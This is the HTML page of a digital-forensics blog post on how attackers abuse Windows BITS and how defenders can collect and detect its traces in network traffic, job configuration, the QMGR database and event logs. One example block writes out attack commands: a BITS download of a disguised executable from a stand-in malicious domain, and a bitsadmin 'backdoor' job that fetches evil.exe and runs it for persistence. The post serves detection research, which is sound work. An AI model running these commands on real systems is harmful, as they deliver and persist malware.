@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <!-- (1) Optimize for mobile versions: http://goo.gl/EOpFl -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- (1) force latest IE rendering engine: bit.ly/1c8EiC9 -->
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  <title>Sharing my BITS</title>
+  <meta name="description" content="I thought I would share some research on Microsoft BITS after a recent tool released by the French ANSSI to parse BITS job artefacts. This tool has sparked my interest due to previous research on d..." />
+
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="@mgreen27" />
+    <meta name="twitter:title" content="Sharing my BITS" />
+    <meta name="twitter:image" content="https://mgreen27.github.io/assets/images/buddyicon.jpg" />
+    
+    <meta name="twitter:description"  content="I thought I would share some research on Microsoft BITS after a recent tool released by the French ANSSI to parse BITS job artefacts. This tool has sparked my interest due to previous research on d..." />
+    
+  
+  
+  <meta property="og:site_name" content="Matt's DFIR blog" />
+  <meta property="og:title" content="Sharing my BITS"/>
+  
+  <meta property="og:description" content="I thought I would share some research on Microsoft BITS after a recent tool released by the French ANSSI to parse BITS job artefacts. This tool has sparked my interest due to previous research on d..." />
+  
+  <meta property="og:image" content="https://mgreen27.github.io/assets/article_images/2018-02-18-Sharing_My_BITS/00title.png" />
+  <meta property="og:url" content="https://mgreen27.github.io/posts/2018/02/18/Sharing_my_BITS.html" >
+  <meta property="og:type" content="blog" />
+  <meta property="article:published_time" content="2018-02-18T00:00:00+11:00">
+
+  <link rel="canonical" href="https://mgreen27.github.io/posts/2018/02/18/Sharing_my_BITS.html"/>
+  <link rel="shortcut icon" href="/assets/images/favicon.png" type="image/png"/>
+  <link rel="stylesheet" href="//brick.a.ssl.fastly.net/Linux+Libertine:400,400i,700,700i/Open+Sans:400,400i,700,700i">
+  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" type="text/css" media="screen" href="/css/main.css" />
+  <link rel="stylesheet" type="text/css" media="print" href="/css/print.css" />
+</head>
+
+  <body itemscope itemtype="http://schema.org/Article">
+    <!-- header start -->
+
+
+  <a href="https://mgreen27.github.io" class="logo-readium"><span class="logo" style="background-image: url(/assets/images/buddyicon.jpg)"></span></a>
+
+<!-- header end -->
+
+    <main class="content" role="main">
+      <article class="post">
+        
+        <div class="article-image">
+          <div class="post-image-image" style="background-image: url(/assets/article_images/2018-02-18-Sharing_My_BITS/00title.png)">
+            Article Image
+          </div>
+          <div class="post-image-image2" style="background-image: url()">
+            Article Image
+          </div>
+          <div class="post-meta">
+            <h1 class="post-title">Sharing my BITS</h1>
+            <div class="cf post-meta-text">
+              <div class="author-image" style="background-image: url(/assets/images/author.jpg)">Blog Logo</div>
+              <h4 class="author-name" itemprop="author" itemscope itemtype="http://schema.org/Person">Matthew Green</h4>
+              on
+              <time datetime="2018-02-18 00:00">18 Feb 2018</time>
+              <!-- , tagged on <span class="post-tag-">, <a href="/tag/"></a></span> -->
+            </div>
+            <div style="text-align:center">
+              <a href="#topofpage" class="topofpage"><i class="fa fa-angle-down"></i></a>
+            </div>
+          </div>
+        </div>
+        
+        <section class="post-content">
+          <div class="post-reading">
+            <span class="post-reading-time"></span> read
+          </div>
+          <a name="topofpage"></a>
+          <p>I thought I would share some research on Microsoft BITS after a recent tool released by the French ANSSI to parse BITS job artefacts. This tool has sparked my interest due to previous research on download cradles and an interest in the client side forensics. I’m going to give a brief background, talk about some nuances in collection types and provide some background information when I was thinking about detection.</p>
+
+<h1 id="what-is-bits-and-why-do-we-care">What is BITS and why do we care?</h1>
+<p>Background Intelligent Transfer Service (BITS) is a Windows component used to transfer files asynchronously between a client and a server. Part of all modern Windows systems from 2000+, the most well known use for BITS is Windows updates and other Windows transfer tasks.</p>
+
+<p>BITS has many interesting features including firewall whitelisted and proxy capable file transfer. BITS can also be configured on a schedule, with prioritisation or throttled transfer over idle network bandwidth. Additional “evil friendly” features are the ability to execute a command line option post job (persistence use case) and transfer policy. A newer feature is peer caching where subnet peer machines can be used as a cache for file downloads.</p>
+
+<p>In short that means BITS fits the profile as a candidate for attackers “living off the land”. Managed via a COM based API, Powershell or a built in binary (bitsadmin.exe), BITS can be used easily throughout the attack lifecycle.</p>
+
+<p>For those interested in digging further, I have included some detailed links on capabilities and configuration in my references below.</p>
+
+<h1 id="artefact-creation">Artefact creation</h1>
+<p>Most of my testing has been working with BITS 5.5 in Windows 8.1, however the content below was tested on Windows 7 through 10.</p>
+
+<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="c"># Bits download initiated via Powershell</span>
+<span class="n">PS</span><span class="p">&gt;</span> <span class="nb">Start-BitsTransfer</span> <span class="n">-Source</span> <span class="s2">&quot;http://www.totallylegitinappnews.com/mimi.jpg&quot;</span> <span class="n">-Destination</span> <span class="s2">&quot;c:\Windows\vss\mimi.exe&quot;</span>
+
+<span class="c"># Peristence via bitsadmin.exe</span>
+<span class="n">CMD</span><span class="p">&gt;</span> <span class="n">bitsadmin</span> <span class="p">/</span><span class="n">create</span> <span class="n">backdoor</span>
+<span class="n">CMD</span><span class="p">&gt;</span> <span class="n">bitsadmin</span> <span class="p">/</span><span class="n">addfile</span> <span class="n">backdoor</span> <span class="s2">&quot;http://www.totallylegitinappnews.com/evil.exe&quot;</span>  <span class="s2">&quot;c:\windows\VSS\evil.exe&quot;</span>
+<span class="n">CMD</span><span class="p">&gt;</span> <span class="n">bitsadmin</span> <span class="p">/</span><span class="n">SetNotifyCmdLine</span> <span class="n">backdoor</span> <span class="n">c</span><span class="err">:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">VSS</span><span class="p">\</span><span class="n">evil</span><span class="p">.</span><span class="n">exe</span> <span class="n">NULL</span>
+<span class="n">CMD</span><span class="p">&gt;</span> <span class="n">bitsadmin</span> <span class="p">/</span><span class="n">resume</span> <span class="n">backdoor</span></code></pre></div>
+
+<p>I have shown some really simple examples above to generate artefacts, however in the wild there are also several attack tools that make building stealthy download cradles trivial. Please see references for more information.</p>
+
+<h1 id="collection---network">Collection - Network</h1>
+<p>Network is by far the easiest collection point via typical web traffic filtering on user agent string and whitelisted domains. Although I have found everything from Windows, to application, to news traffic, with most BITS traffic is fairly static over time. I have found interesting use cases baselining current activity then spotting deviations from normal focusing on content, http method, destination and URL.</p>
+
+<div style="text-align: center;"><img src="/assets/article_images/2018-02-18-Sharing_My_BITS/01pcap.png" width="500" /></div>
+
+<p>Limitations in some environments are the obvious here: encrypted traffic. This method will also miss BITS setup with notification command line and not reaching out of the network.</p>
+
+<h1 id="collection---endpoint">Collection - Endpoint</h1>
+<p>Endpoint is by far the most detailed collection point, but generally the most difficult to master. I have broken out the endpoint into various sections to provide insights. “Defending off the land”, my goals are to find a lightweight collection capability to pull into a scripted solution without pre installation or change of audit policy. Unfortunately, that means probably the most valuable detection points: event monitoring via EDR, Sysmon and EventID 4688 (Process Creation + CLI) events are out, however some of the artefacts can be collected via EDR tools.</p>
+
+<h2 id="bits-job-configuration">Bits job configuration</h2>
+<p>BITS can be configured and jobs reviewed using either Powershell command-lets or bitsadmin.exe. Limitations on this type of collection are: unless collected during the transfer, only scheduled jobs are available.</p>
+
+<p><img src="/assets/article_images/2018-02-18-Sharing_My_BITS/02powershell.png" alt=" " /></p>
+
+<p>In my testing, both methods provide similar granular information on job details, however Bitsadmin does provide additional context. In my example below you can see additional configuration of the notification command line feature, also bypassing Autoruns detection.</p>
+
+<p><img src="/assets/article_images/2018-02-18-Sharing_My_BITS/03powershell.png" alt=" " /></p>
+
+<h2 id="qmgr-database">QMGR database</h2>
+<p>Queue Manager queues store job specification and state. Typically located at: C:\ProgramData\Microsoft\Network\Downloader. For pre-Windows 10 systems, QMGR is stored in files named qmgr0.dat or qmgr1.dat.</p>
+
+<p>Limitations are: Microsoft has migrated to ESE database format for Queue Manager in Windows 10 and beyond leaving with a solution that would only work on some current systems.</p>
+
+<p>These are the files parsed by the ANSSI tool - bits_parser. Initially I toyed with the idea of a light weight binary parser in Powershell, to replicate bits_paser in non carving mode and roll in seperate capability for Windows 10.</p>
+
+<p><img src="/assets/article_images/2018-02-18-Sharing_My_BITS/04bitsparser.png" alt=" " /></p>
+
+<p>Results worked but led me to the second limitation: visibility is focused on scheduled or recent jobs. Thats is great for the BITS persistence use case but single BITS tasks can rotate out of the Queue Manager quickly and may not be recoverable even with carving. Assuming available data, I also found carving in Powershell was too resource intensive for a light weight collection so the preferred method would be to collect and parse offline if carving is required.</p>
+
+<h2 id="windows-event-logs">Windows Event logs</h2>
+<p>Focusing on default event logs, the best source for detection of malicious download is the Microsoft-Windows-Bits-Client/Operational log. These logs hold: state, source, user and some file information for each BITS transfer. This event log also appears to be similar across Windows 7 through 10 so fits the profile and a good endpoint collection source.</p>
+
+<div style="text-align: center;"><img src="/assets/article_images/2018-02-18-Sharing_My_BITS/05eventlogs.png" width="500" /></div>
+
+<p>Limitations include: sparse data, logs are spread over several EventIDs and potentially a lot of entries in a production environment making it difficult to spot evil hiding in the noise. This log will also not shed light on abuse of BITS for persistence unless there was a network transfer to a suspicious domain as part of the configured job.</p>
+
+<p>Writing a script to pull all EventID 59 events, highlighting some of the available information from the event: Time (converted to UTC), JobName and Source URL we can see the kind of noise to expect in a few hours activity.</p>
+
+<p><img src="/assets/article_images/2018-02-18-Sharing_My_BITS/06bitsdetectall.png" alt=" " /></p>
+
+<p>Following similar concepts to network based detection, I was able to build a whitelist for common domains from my network logs and whitelist out most of the noise potentially seen day to day.</p>
+
+<p><img src="/assets/article_images/2018-02-18-Sharing_My_BITS/07bitsdetect.png" alt=" " /></p>
+
+<p>This method may be particularly helpful in environments that may have limitations on network encryption visibility. Some work is required to build out the whitelist with lots of outliers in a large network.</p>
+
+<p>My content is <a href="https://github.com/mgreen27/Invoke-BitsParser">available here</a>. Some of the other features I have added are:</p>
+
+<ul>
+  <li>Configuration of days back to search (default 14).</li>
+  <li>A switch (“-All”) to list all entries available in the logs to collect data to rejig whitelists from an endpoint view.</li>
+</ul>
+
+<h1 id="final-thoughts">Final Thoughts</h1>
+<p>I couldn’t finish this post without talking a little about capabilities all organisations should aspire to. Gold standard should be a mix of network and endpoint based visibility, with the ability to cover all gaps from each single source.</p>
+
+<p>Critical for a modern blue team, some of my recommendations are:</p>
+
+<ul>
+  <li>Network based visibility around encrypted web traffic with content inspection.</li>
+  <li>Process command line visibility on the endpoints to spot evil process chains and unusual command lines or obfuscation that is abnormal for the environment.</li>
+  <li>Process module load visibility to spot unexpected functionality loaded.</li>
+  <li>Process network activity to unexpected locations is also a good method to increase the scope of detection on the endpoint and provide additional context to network detections that may have visibility limitations.</li>
+  <li>Spotting disk or registry write events out of normal activity and having context of associated process. Why is svchost.exe writing evil.exe to c:\Windows\VSS?</li>
+  <li>Ability to execute adlib collections to answer questions of the environment.</li>
+  <li>Upgrading to Powershell version 5 for Powershell script block visibility.</li>
+</ul>
+
+<p>I hope this post has provided some good food for thought and pointed anyone interested in the direction for further research and reference material. Feel free to reach out if you have any questions.</p>
+
+<h2 id="references">References</h2>
+<p>1) ANSSI. <a href="https://github.com/ANSSI-FR/bits_parser">Bits_Parser</a></p>
+
+<p>2) Azouri, Dor. <a href="https://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20presentations/Dor%20Azouri/DEFCON-25-Dor-Azouri-BITSInject-WP.pdf">BITSInject</a></p>
+
+<p>3) Bohannon, Daniel. <a href="https://github.com/danielbohannon/Invoke-CradleCrafter">Invoke-CradleCrafter</a></p>
+
+<p>4) Geiger,Matthew. <a href="https://www.dfrws.org/sites/default/files/session-files/pres-finding_your_naughty_bits.pdf">Finding Your Naughty BITS</a></p>
+
+<p>5) Hexacorn. <a href="http://www.hexacorn.com/blog/2017/07/12/beyond-good-ol-run-key-part-64/">Beyond Good Old RUn Key part 64</a></p>
+
+<p>6) Microsoft. <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753856(v=ws.11)">Bitsadmin documentation</a></p>
+
+<p>7) Microsoft. <a href="https://github.com/MicrosoftDocs/windows-powershell-docs/tree/master/docset/windows/bitstransfer">Powershell Bitstransfer documentation</a></p>
+
+<p>8) Microsoft. <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ee663885(v=vs.85).aspx">Using Windows Powershell to create BITS Jobs</a></p>
+
+<p>9) O’Day, Dan. <a href="https://github.com/danzek/annotationis/blob/master/Operating%20Systems/Windows/BITS.md">BITS annotationis</a></p>
+
+<p>10) Secureworks, Counter Threat Unit. <a href="https://www.secureworks.com/blog/malware-lingers-with-bits">Malware Lingers with BITS</a></p>
+
+
+        </section>
+        <footer class="post-footer">
+          <section class="share">
+            
+              
+                <a class="icon-twitter" href="http://twitter.com/share?text=Sharing+my+BITS&amp;url=https://mgreen27.github.io/posts/2018/02/18/Sharing_my_BITS"
+                  onclick="window.open(this.href, 'twitter-share', 'width=550,height=255');return false;">
+                <i class="fa fa-twitter"></i><span class="hidden">twitter</span>
+                </a>
+              
+            
+              
+                <a class="icon-linkedin" href="http://www.linkedin.com/shareArticle?mini=true&amp;title=Sharing+my+BITS&amp;url=https://mgreen27.github.io/posts/2018/02/18/Sharing_my_BITS"
+                  onclick="window.open(this.href, 'linkedin-share', 'width=550,height=255');return false;">
+                <i class="fa fa-linkedin"></i><span class="hidden">linkedin</span>
+                </a>
+              
+            
+              
+            
+          </section>
+        </footer>
+        <div class="bottom-teaser cf">
+          <div class="isLeft">
+            <h5 class="index-headline featured"><span>Written by</span></h5>
+            <section class="author">
+              <div class="author-image" style="background-image: url(/assets/images/author.jpg)">Blog Logo</div>
+              <h4>Matthew Green</h4>
+              <p class="bio"></p>
+              <hr>
+              <p class="published">Published <time datetime="2018-02-18 00:00">18 Feb 2018</time></p>
+            </section>
+          </div>
+          
+          <div class="isRight">
+            <h5 class="index-headline featured"><span>Supported by</span></h5>
+            <footer class="site-footer">
+              <section class="poweredby">Proudly published with <a href="http://jekyllrb.com"> Jekyll</a></section>
+              <a class="subscribe" href="/feed.xml"> <span class="tooltip"> <i class="fa fa-rss"></i> You should subscribe to my feed.</span></a>
+              <div class="inner">
+                <section class="copyright">All content copyright <a href="/">Matthew Green</a> &copy; 2018<br>All rights reserved.</section>
+              </div>
+            </footer>
+          </div>
+        </div>
+        
+      </article>
+    </main>
+    <div class="bottom-closer">
+      <div class="background-closer-image"  style="background-image: url(/assets/images/luna_background.jpg)">
+        Image
+      </div>
+      <div class="inner">
+        <h1 class="blog-title">Matt's DFIR blog</h1>
+        <h2 class="blog-description">A blog for DFIR thoughts, research and future reference
+</h2>
+        <a href=/ class="btn">Back to Overview</a>
+      </div>
+    </div>
+    <script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
+<script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/assets/js/index.js"></script>
+<script type="text/javascript" src="/assets/js/readingTime.min.js"></script>
+<script>
+(function ($) {
+  "use strict";
+  $(document).ready(function(){
+
+    var $window = $(window),
+    $image = $('.post-image-image, .teaserimage-image');
+    
+      $window.on('scroll', function() {
+        var top = $window.scrollTop();
+
+        if (top < 0 || top > 1500) { return; }
+        $image
+          .css('transform', 'translate3d(0px, '+top/3+'px, 0px)')
+          .css('opacity', 1-Math.max(top/700, 0));
+      });
+      $window.trigger('scroll');
+
+      var height = $('.article-image').height();
+      $('.post-content').css('padding-top', height + 'px');
+
+      $('a[href*=#]:not([href=#])').click(function() {
+        if (location.pathname.replace(/^\//,'') == this.pathname.replace(/^\//,'')
+         && location.hostname == this.hostname) {
+          var target = $(this.hash);
+          target = target.length ? target : $('[name=' + this.hash.slice(1) +']');
+          if (target.length) {
+            $('html,body').animate({ scrollTop: target.offset().top }, 500);
+            return false;
+          }
+        }
+      });
+
+  });
+}(jQuery));
+</script>
+
+<!-- Google Analytics -->
+<script>
+   (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-109549583-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+
+
+
+  </body>
+</html>
